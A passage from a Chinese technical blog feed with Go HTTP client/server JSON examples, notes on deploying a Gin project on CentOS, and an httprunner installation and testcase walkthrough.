class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myhandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	fmt.Println(r.RemoteAddr, <span class="string">&quot;连接成功&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;method:&quot;</span>, r.Method)</span><br><span class="line">	fmt.Println(<span class="string">&quot;url:&quot;</span>, r.URL)</span><br><span class="line">	fmt.Println(<span class="string">&quot;header:&quot;</span>, r.Header)</span><br><span class="line">	fmt.Println(<span class="string">&quot;body:&quot;</span>, r.Body)</span><br><span class="line">	<span class="comment">// 服务器回复内容</span></span><br><span class="line">	w.Write([]<span class="type">byte</span>(<span class="string">&quot;hello word!&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 监控客户端发送的请求网址后缀为/go,并调用自定义回调函数</span></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/go&quot;</span>, myhandler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/bar&quot;</span>, myHandlerJson)</span><br><span class="line">	http.ListenAndServe(<span class="string">&quot;127.0.0.1:8000&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="client1"><a href="#client1" class="headerlink" title="client1"></a>client1</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">#  hello_work/http/client</span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Cmd <span class="keyword">struct</span> &#123;</span><br><span class="line">	ReqType  <span class="type">int</span></span><br><span class="line">	username <span class="type">string</span></span><br><span class="line">	pwd      <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">start</span><span class="params">(s <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> strings.ToUpper(s) == <span class="string">&quot;POST&quot;</span> &#123;</span><br><span class="line">		contentType := <span class="string">&quot;application/json;charset=utf-8&quot;</span></span><br><span class="line">		url := <span class="string">&quot;http://127.0.0.1:8000/bar&quot;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 定义传送给服务器的json</span></span><br><span class="line">		cmd := Cmd&#123;ReqType: <span class="number">1</span>, Username: <span class="string">&quot;test1&quot;</span>, Pwd: <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">		<span class="comment">// 把结构体转换为json</span></span><br><span class="line">		b, err := json.Marshal(cmd)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;json格式错误,error:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 把json参数转换为bytes，传给服务端</span></span><br><span class="line">		body := bytes.NewBuffer(b)</span><br><span class="line">		resp, err := http.Post(url, contentType, body)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;http request is fail,error:&quot;</span>, err)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">		<span class="comment">// content, err := ioutil.ReadAll(resp.Body)</span></span><br><span class="line">		<span class="comment">// if err != nil &#123;</span></span><br><span class="line">		<span class="comment">// 	fmt.Println(&quot;Read failed:&quot;, err)</span></span><br><span class="line">		<span class="comment">// 	return</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">		<span class="comment">// 不写结构体，直接用这种方式定义</span></span><br><span class="line">		formData := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">		json.NewDecoder(resp.Body).Decode(&amp;formData)</span><br><span class="line"></span><br><span class="line">		<span class="comment">// jsonErr := json.Unmarshal(content, &amp;formData) // 解码服务端传递的json</span></span><br><span class="line">		<span class="comment">// if jsonErr != nil &#123;</span></span><br><span class="line">		<span class="comment">// 	fmt.Println(jsonErr)</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">		<span class="comment">// 数据结构体</span></span><br><span class="line">		<span class="comment">//map[Code:0 Data:[map[Age:18 Name:li] map[Age:18 Name:li] map[Age:18 Name:li]] Msg:success Param:1]</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;读取服务器数据成功&quot;</span>, formData)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> key, value := <span class="keyword">range</span> formData &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%s: %v\n&quot;</span>, key, value)</span><br><span class="line">			<span class="keyword">if</span> key == <span class="string">&quot;Data&quot;</span> &#123;</span><br><span class="line">				<span class="comment">// 判断value是否是一个切片，再使用for循环遍历切片中的每个元素</span></span><br><span class="line">				<span class="keyword">if</span> _, ok := value.([]<span class="keyword">interface</span>&#123;&#125;); ok &#123;</span><br><span class="line">					<span class="keyword">for</span> _, v := <span class="keyword">range</span> value.([]<span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">						<span class="comment">// 循环取map中的值</span></span><br><span class="line">						<span class="keyword">for</span> j, s := <span class="keyword">range</span> v.(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">							fmt.Printf(<span class="string">&quot;%s: %v\n&quot;</span>, j, s)</span><br><span class="line"></span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:8000/go&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;连接服务器失败,error&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">		fmt.Println(<span class="string">&quot;code:&quot;</span>, resp.StatusCode)</span><br><span class="line">		buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>)</span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			<span class="comment">// 接受服务器信息</span></span><br><span class="line">			n, err := resp.Body.Read(buf)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err != io.EOF &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;读取服务器数据失败,error:&quot;</span>, err)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			fmt.Println(<span class="string">&quot;读取服务器数据成功&quot;</span>)</span><br><span class="line">			res := <span class="type">string</span>(buf[:n])</span><br><span class="line">			fmt.Println(res)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	start(<span class="string">&quot;post&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>运行结果</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">S E:\proj\gowork&gt; <span class="keyword">go</span> run .\hello_work\http\client.<span class="keyword">go</span></span><br><span class="line">读取服务器数据成功 <span class="keyword">map</span>[Code:<span class="number">0</span> Data:[<span class="keyword">map</span>[Age:<span class="number">18</span> Name:li] <span class="keyword">map</span>[Age:<span class="number">18</span> Name:li] <span class="keyword">map</span>[Age:<span class="number">18</span> Name:li]] Msg:success Param:<span class="number">1</span>]</span><br><span class="line">Code: <span class="number">0</span></span><br><span class="line">Param: <span class="number">1</span></span><br><span class="line">Msg: success</span><br><span class="line">Data: [<span class="keyword">map</span>[Age:<span class="number">18</span> Name:li] <span class="keyword">map</span>[Age:<span class="number">18</span> Name:li] <span class="keyword">map</span>[Age:<span class="number">18</span> Name:li]]</span><br><span class="line">Name: li</span><br><span class="line">Age: <span class="number">18</span></span><br><span class="line">Name: li</span><br><span class="line">Age: <span class="number">18</span></span><br><span class="line">Name: li</span><br><span class="line">Age: <span class="number">18</span></span><br><span class="line"></span><br><span class="line">PS E:\proj\gowork&gt; <span class="keyword">go</span> run .\hello_work\http\server.<span class="keyword">go</span></span><br><span class="line">key: ReqType  =&gt; value : <span class="number">1</span></span><br><span class="line">key: Username  =&gt; value : test1</span><br><span class="line">key: Pwd  =&gt; value : <span class="number">123456</span></span><br><span class="line">key: ReqType  =&gt; value : <span class="number">1</span> </span><br></pre></td></tr></table></figure>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>在处理json这种数据结构时，感觉go还是比较复杂，还是python用起来更舒服</p>
</li>
<li><p><a href="http://www.topgoer.com/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">网络编程</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>go部署实践</title>
    <url>/aposts/57a9c16f/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>本次笔记主要记录部署go</li>
<li>服务信息为centos 7</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos home]# uname -a</span><br><span class="line">Linux VM-24-13-centos 3.10.0-1160.11.1.el7.x86_64 #1 SMP Fri Dec 18 16:34:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="直接部署"><a href="#直接部署" class="headerlink" title="直接部署"></a>直接部署</h2><ul>
<li>分别为下载，解压go</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos /]# cd home</span><br><span class="line">[root@VM-24-13-centos home]# wget https://dl.google.com/go/go1.20.4.linux-amd64.tar.gz</span><br><span class="line">[root@VM-24-13-centos home]# tar -zxvf go1.20.4.linux-amd64.tar.gz</span><br><span class="line">[root@VM-24-13-centos bin]# pwd</span><br><span class="line">/home/go/bin</span><br><span class="line">[root@VM-24-13-centos bin]# ./go version</span><br><span class="line">go version go1.20.4 linux/amd64</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>配置go的环境变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos bin]# vi /etc/profile </span><br><span class="line"></span><br><span class="line">export GOPATH=/home/go</span><br><span class="line">export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin</span><br><span class="line"></span><br><span class="line"># 生效环境变量</span><br><span class="line">[root@VM-24-13-centos bin]# source profile</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos etc]# go version</span><br><span class="line">go version go1.20.4 linux/amd64</span><br></pre></td></tr></table></figure>

<ul>
<li>服务器需要搭建好mysql环境，以及建好数据库，可以参考<a href="https://www.jianshu.com/p/e51a21388363">这篇文章</a>中的MySQL安装过程</li>
</ul>
<p><img src="/aposts/57a9c16f/image-20230731105226623.png" alt="image-20230731105226623"></p>
<ul>
<li>使用 Git 克隆你的 Gin 项目到服务器上，并设置go的代理</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos home]# git clone https://github.com/Louis-me/studyGin.git</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos home]# cd studyGin/</span><br><span class="line">[root@VM-24-13-centos home]#go env -w GO111MODULE=on</span><br><span class="line">[root@VM-24-13-centos home]# go env -w GOPROXY=https://proxy.golang.com.cn,direct</span><br><span class="line"># 编译下载依赖文件</span><br><span class="line">[root@VM-24-13-centos studyGin]# go build</span><br><span class="line"># 启动项目</span><br><span class="line">[root@VM-24-13-centos studyGin]# ./myGin</span><br></pre></td></tr></table></figure>

<ul>
<li>注意gin的服务端口信息为8080，防火墙需要打开，若时云服务器那么规则端口也要打开</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br><span class="line">firewall-cmd --reload   # 配置立即生效</span><br><span class="line">firewall-cmd --zone=public --list-port # 查看防火墙所有开放的端口</span><br><span class="line"> firewall-cmd --state # 查看防火墙状态</span><br><span class="line">netstat -lnpt # 查看监听的端口</span><br><span class="line">netstat -lnpt |grep 8080 # 查看监听的具体端口</span><br></pre></td></tr></table></figure>

<ul>
<li>测试</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">data =&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://182.XXX.XXX.XXX:8080/login&quot;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line">dic = json.loads(resp.text)</span><br><span class="line">token = dic[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;Token&quot;</span>]</span><br><span class="line">header = &#123;<span class="string">&quot;token&quot;</span>: token&#125;</span><br><span class="line">resp2 = requests.get(<span class="string">&quot;http://182.XXX.XXX.XXXX:8080/GetUserList&quot;</span>, headers=header)</span><br><span class="line"><span class="built_in">print</span>(resp2.text)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果需要在后台运行项目，并且在关闭终端时项目依然保持运行状态，可以使用 <code>nohup</code> 命令：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos studyGin]# ./myGin</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos studyGin]# nohup ./myGin &gt; gin.log &amp;</span><br><span class="line">[2] 16486</span><br><span class="line">[root@VM-24-13-centos studyGin]# nohup: 忽略输入重定向错误到标准输出端</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>httprunner的安装和使用</title>
    <url>/aposts/aa9cf483/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>本次搭建的为在win10下搭建httprunner</li>
</ul>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul>
<li><p>通过<a href="https://github.com/httprunner/httprunner/releases">github</a>下载最新的版本，进行编译，我现在下载的版本为：<code>hrp-v4.2.0-windows-amd64.tar</code></p>
</li>
<li><p>配置环境变量PATH中的hrp的exe路径，<code>D:\app\hrp-v4.2.0-windows-amd64</code></p>
</li>
<li><p>检查配置环境，打开cmd输入：<code>hrp -h</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;hrp -h</span><br><span class="line"></span><br><span class="line">License: Apache-2.0</span><br><span class="line">Website: https://httprunner.com</span><br><span class="line">Github: https://github.com/httprunner/httprunner</span><br><span class="line">Copyright 2017 debugtalk</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  hrp [command]</span><br></pre></td></tr></table></figure>

<ul>
<li>创建项目,选择py插件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\project&gt;hrp startproject demo --py</span><br><span class="line">...</span><br><span class="line">1:23AM INF python package is ready name=httprunner version=v4.2.0</span><br><span class="line">11:23AM INF set python3 executable path Python3Executable=&quot;C:\\Users\\Administrator\\.hrp\\venv\\Scripts\\python.exe&quot;</span><br><span class="line">11:23AM INF create scaffold success projectName=demo</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本地python版本为3.7</p>
<p>hrp startproject demo –go 选择go插件</p>
</blockquote>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><ul>
<li>查看项目代码结构如下：</li>
</ul>
<p><img src="/aposts/aa9cf483/image-20220905153421725.png" alt="image-20220905153421725"></p>
<h3 id="har"><a href="#har" class="headerlink" title="har"></a>har</h3><p> 用 Charles 等抓包工具，以及 Chrome 等浏览器均可以导出 HAR 格式的请求文件，查看<a href="https://httprunner.com/docs/user-guide/gen-tests/record/">这里</a></p>
<h3 id="reports"><a href="#reports" class="headerlink" title="reports"></a>reports</h3><p>存放测试报告的目录</p>
<h3 id="testcases"><a href="#testcases" class="headerlink" title="testcases"></a>testcases</h3><p> 放测试用例的目录，支持json和yml，看下demo.json的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;config&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;demo with complex mechanisms&quot;,</span><br><span class="line">        &quot;base_url&quot;: &quot;https://postman-echo.com&quot;,</span><br><span class="line">        &quot;variables&quot;: &#123;</span><br><span class="line">            &quot;a&quot;: &quot;$&#123;sum(10, 2.3)&#125;&quot;,</span><br><span class="line">            &quot;b&quot;: 3.45,</span><br><span class="line">            &quot;n&quot;: &quot;$&#123;sum_ints(1, 2, 2)&#125;&quot;,</span><br><span class="line">            &quot;varFoo1&quot;: &quot;$&#123;gen_random_string($n)&#125;&quot;,</span><br><span class="line">            &quot;varFoo2&quot;: &quot;$&#123;max($a, $b)&#125;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;teststeps&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;transaction 1 start&quot;,</span><br><span class="line">            &quot;transaction&quot;: &#123;</span><br><span class="line">                &quot;name&quot;: &quot;tran1&quot;,</span><br><span class="line">                &quot;type&quot;: &quot;start&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;get with params&quot;,</span><br><span class="line">            &quot;request&quot;: &#123;</span><br><span class="line">                &quot;method&quot;: &quot;GET&quot;,</span><br><span class="line">                &quot;url&quot;: &quot;/get&quot;,</span><br><span class="line">                &quot;params&quot;: &#123;</span><br><span class="line">                    &quot;foo1&quot;: &quot;$varFoo1&quot;,</span><br><span class="line">                    &quot;foo2&quot;: &quot;$varFoo2&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;headers&quot;: &#123;</span><br><span class="line">                    &quot;User-Agent&quot;: &quot;HttpRunnerPlus&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;variables&quot;: &#123;</span><br><span class="line">                &quot;b&quot;: 34.5,</span><br><span class="line">                &quot;n&quot;: 3,</span><br><span class="line">                &quot;name&quot;: &quot;get with params&quot;,</span><br><span class="line">                &quot;varFoo2&quot;: &quot;$&#123;max($a, $b)&#125;&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;setup_hooks&quot;: [</span><br><span class="line">                &quot;$&#123;setup_hook_example($name)&#125;&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;teardown_hooks&quot;: [</span><br><span class="line">                &quot;$&#123;teardown_hook_example($name)&#125;&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;extract&quot;: &#123;</span><br><span class="line">                &quot;varFoo1&quot;: &quot;body.args.foo1&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;validate&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;status_code&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: 200,</span><br><span class="line">                    &quot;msg&quot;: &quot;check response status code&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;headers.\&quot;Content-Type\&quot;&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;startswith&quot;,</span><br><span class="line">                    &quot;expect&quot;: &quot;application/json&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;body.args.foo1&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;length_equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: 5,</span><br><span class="line">                    &quot;msg&quot;: &quot;check args foo1&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;$varFoo1&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;length_equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: 5,</span><br><span class="line">                    &quot;msg&quot;: &quot;check args foo1&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;body.args.foo2&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: &quot;34.5&quot;,</span><br><span class="line">                    &quot;msg&quot;: &quot;check args foo2&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;transaction 1 end&quot;,</span><br><span class="line">            &quot;transaction&quot;: &#123;</span><br><span class="line">                &quot;name&quot;: &quot;tran1&quot;,</span><br><span class="line">                &quot;type&quot;: &quot;end&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;post json data&quot;,</span><br><span class="line">            &quot;request&quot;: &#123;</span><br><span class="line">                &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">                &quot;url&quot;: &quot;/post&quot;,</span><br><span class="line">                &quot;body&quot;: &#123;</span><br><span class="line">                    &quot;foo1&quot;: &quot;$varFoo1&quot;,</span><br><span class="line">                    &quot;foo2&quot;: &quot;$&#123;max($a, $b)&#125;&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;validate&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;status_code&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: 200,</span><br><span class="line">                    &quot;msg&quot;: &quot;check status code&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;body.json.foo1&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;length_equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: 5,</span><br><span class="line">                    &quot;msg&quot;: &quot;check args foo1&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;body.json.foo2&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: 12.3,</span><br><span class="line">                    &quot;msg&quot;: &quot;check args foo2&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;post form data&quot;,</span><br><span class="line">            &quot;request&quot;: &#123;</span><br><span class="line">                &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">                &quot;url&quot;: &quot;/post&quot;,</span><br><span class="line">                &quot;headers&quot;: &#123;</span><br><span class="line">                    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;body&quot;: &#123;</span><br><span class="line">                    &quot;foo1&quot;: &quot;$varFoo1&quot;,</span><br><span class="line">                    &quot;foo2&quot;: &quot;$&#123;max($a, $b)&#125;&quot;,</span><br><span class="line">                    &quot;time&quot;: &quot;$&#123;get_timestamp()&#125;&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;extract&quot;: &#123;</span><br><span class="line">                &quot;varTime&quot;: &quot;body.form.time&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;validate&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;status_code&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: 200,</span><br><span class="line">                    &quot;msg&quot;: &quot;check status code&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;body.form.foo1&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;length_equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: 5,</span><br><span class="line">                    &quot;msg&quot;: &quot;check args foo1&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;body.form.foo2&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: &quot;12.3&quot;,</span><br><span class="line">                    &quot;msg&quot;: &quot;check args foo2&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;get with timestamp&quot;,</span><br><span class="line">            &quot;request&quot;: &#123;</span><br><span class="line">                &quot;method&quot;: &quot;GET&quot;,</span><br><span class="line">                &quot;url&quot;: &quot;/get&quot;,</span><br><span class="line">                &quot;params&quot;: &#123;</span><br><span class="line">                    &quot;time&quot;: &quot;$varTime&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;validate&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;check&quot;: &quot;body.args.time&quot;,</span><br><span class="line">                    &quot;assert&quot;: &quot;length_equals&quot;,</span><br><span class="line">                    &quot;expect&quot;: 13,</span><br><span class="line">                    &quot;msg&quot;: &quot;check extracted var timestamp&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在json里面引用的函数如<code>&#123;sum(10, 2.3)&#125;</code>，需要在<code>debugtalk.py</code>自定义，但是<code>max</code>应该为内置函数，不用自定义编写</li>
<li>事务代码说明</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type Transaction struct &#123;</span><br><span class="line">   Name string          `json:&quot;name&quot; yaml:&quot;name&quot;` // 事务名称，可定义为任意字符串</span><br><span class="line">   Type transactionType `json:&quot;type&quot; yaml:&quot;type&quot;` // 事务类型，仅包括 2 种类型，start（事务开始）和 end（结束事务）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>在测试用例中，transaction 应该成对出现，即必须同时定义 start 和 end；如果存在配对缺失的情况，会按照如下逻辑进行处理：<ul>
<li>仅设置开始事务，则会在测试用例最后一个测试步后添加结束事务</li>
<li>仅设置结束事务，则会在测试用例第一个测试步前添加开始事务</li>
</ul>
</li>
</ul>
</blockquote>
<ul>
<li>更多的手工编写用例<a href="https://httprunner.com/docs/user-guide/gen-tests/write-cases/">介绍</a></li>
</ul>
<h3 id="其他文件"><a href="#其他文件" class="headerlink" title="其他文件"></a>其他文件</h3><ul>
<li><code>.env</code> 配置环境变量信息，如登录的信息</li>
<li><code>debugtalk.py</code> 自定义函数</li>
<li><code>proj.json</code> 项目的信息</li>
</ul>
<h2 id="运行用例"><a href="#运行用例" class="headerlink" title="运行用例"></a>运行用例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\project\demo&gt;hrp run testcases\demo.json --gen-html-report</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">==================== response ====================</span><br><span class="line">Connected via TLSv1.2</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 406</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Date: Mon, 05 Sep 2022 08:08:52 GMT</span><br><span class="line">Etag: W/&quot;196-F4bYgnayuG8mswnHB8kP+Hk/6J4&quot;</span><br><span class="line">Set-Cookie: sails.sid=s%3AF7CgL7_NwzZjvKsH7GKmjPHovUPl7kza.7RUa8O71oEJjVUKcWKAkLw0m0ztEnlmlVzJimZz5H2E; Path=/; HttpOnly</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span 